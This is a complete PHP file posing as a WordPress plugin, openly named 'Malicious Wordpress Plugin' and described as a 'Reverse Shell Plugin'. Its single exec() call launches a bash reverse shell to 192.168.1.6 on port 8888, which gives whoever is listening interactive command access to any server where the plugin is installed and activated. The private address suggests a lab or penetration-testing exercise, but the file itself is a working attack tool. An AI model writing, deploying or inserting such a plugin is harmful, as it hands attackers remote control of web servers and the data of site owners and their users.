<?php

/**
* Plugin Name: Malicious Wordpress Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: m3rc
* Author URI: https://github.com/Im3rc
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.6/8888 0>&1'");
?>
